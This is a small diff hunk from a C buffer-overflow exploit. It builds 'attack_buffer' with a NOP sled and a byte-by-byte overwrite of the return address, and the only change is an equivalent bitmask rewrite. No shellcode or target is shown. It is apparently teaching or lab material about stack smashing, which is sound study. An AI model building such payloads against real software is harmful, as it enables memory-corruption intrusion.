@@ -23,7 +23,7 @@ main ( int argc, char * argv[] )
 		attack_buffer[i] = 0x90;
 
 	attack_buffer[BUF_TO_RET + 3] = (char) (BUF_ADDR & 0x000000ff);
-	attack_buffer[BUF_TO_RET + 2] = (char) ((BUF_ADDR >> 8) & 0x000000ff);
+	attack_buffer[BUF_TO_RET + 2] = (char) ((BUF_ADDR >> 8) & 0xff);
 	attack_buffer[BUF_TO_RET + 1] = (char) ((BUF_ADDR >> 16) & 0x000000ff);
 	attack_buffer[BUF_TO_RET] = (char) (BUF_ADDR >> 24);
 	attack_buffer[BUF_TO_RET + 4] = '\0';
